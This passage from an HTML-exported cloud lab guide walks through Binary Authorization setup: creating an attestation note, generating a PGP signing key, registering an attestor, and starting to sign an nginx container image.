0.1px;">  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Submit the </span><code>ATTESTATION</code><span> note to the Container Analysis API:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -X POST \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  -H "Content-Type: application/json" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  -H "Authorization: Bearer $(gcloud auth print-access-token)"  \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --data-binary @${NOTE_PAYLOAD_PATH}  \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  "https://containeranalysis.googleapis.com/v1beta1/projects/${PROJECT_ID}/notes/?noteId=${NOTE_ID}"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see the output from the prior command display the created note, but the following command will also list the created note:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -H "Authorization: Bearer $(gcloud auth print-access-token)"  \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  "https://containeranalysis.googleapis.com/v1beta1/projects/${PROJECT_ID}/notes/${NOTE_ID}"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='creating-a-pgp-signing-key'><span>Creating a PGP signing key</span></h3><p><span>As your attestation authority uses a PGP key to perform the cryptographic signing of the image metadata, create a new PGP key and export the public PGP key.</span></p><p><strong><span>Note:</span></strong><span> This error messages related to this activity. PGP key is not password protected for this exercise. In a production system, be sure to properly safeguard your private PGP keys.</span></p><ol start='' ><li><p><span>Set another shell variable:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PGP_PUB_KEY="generated-key.pgp"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Create the PGP key:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install rng-tools</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo rngd -r /dev/urandom</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gpg --quick-generate-key --yes ${ATTESTOR_EMAIL}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Press </span><strong><span>Enter</span></strong><span> to use an empty passphrase and acknowledge warnings.</span></p></li><li><p><span>Extract the public PGP key:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gpg --armor --export "${ATTESTOR_EMAIL}" &gt; ${PGP_PUB_KEY}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='registering-the-attestor-in-the-binary-authorization-api'><span>Registering the Attestor in the Binary Authorization API</span></h3><p><span>The next step is to create the &quot;attestor&quot; in the Binary Authorization API and add the public PGP key to it.</span></p><ol start='' ><li><p><span>Create the Attestor in the Binary Authorization API:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud --project="${PROJECT_ID}" \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  beta container binauthz attestors create "${ATTESTOR}" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --attestation-authority-note="${NOTE_ID}" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --attestation-authority-note-project="${PROJECT_ID}"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Add the PGP Key to the Attestor:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud --project="${PROJECT_ID}" \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  beta container binauthz attestors public-keys add \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --attestor="${ATTESTOR}" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --pgp-public-key-file="${PGP_PUB_KEY}"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>List the newly created Attestor:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud --project="${PROJECT_ID}" \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  beta container binauthz attestors list</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look similar to the following:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: manually-verified</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NOTE: projects/&lt;project_id&gt;/notes/Human-Attestor-Note</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NUM_PUBLIC_KEYS: 1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project_id&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><h2 id='task-10-signing-a-container-image'><span>Task 10. &quot;Signing&quot; a container image</span></h2><p><span>The preceeding steps only need to be performed once. From this point on, this step is the only step that needs repeating for every new container image.</span></p><p><span>The </span><code>nginx</code><span> image at </span><code>nginx:latest</code><span> is already built and available for use. Perform the manual attestations on it as if it were your own image built by your own processes and save the step of having to build it.</span></p><ol start='' ><li><p><span>Set a few shell variables:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GENERATED_PAYLOAD="generated_payload.json"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GENERATED_SIGNATURE="generated_signature.pgp"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Get the PGP fingerprint:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PGP_FINGERPRINT="$(gpg --list-keys ${ATTESTOR_EMAIL} | head -2 | tail -1 | awk '{print $1}')"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Obtain the SHA256 Digest of the container image:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IMAGE_PATH="gcr.io/${PROJECT_ID}/nginx"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IMAGE_DIGEST="$(gcloud container images list-tags --format='get(digest)' $IMAGE_PATH | head -1)"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Create a JSON-formatted signature payload:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud beta container binauthz create-signature-payload \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --artifact-url="${IMAGE_PATH}@${IMAGE_DIGEST}" &gt; ${GENERATED_PAYLOAD}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>View the 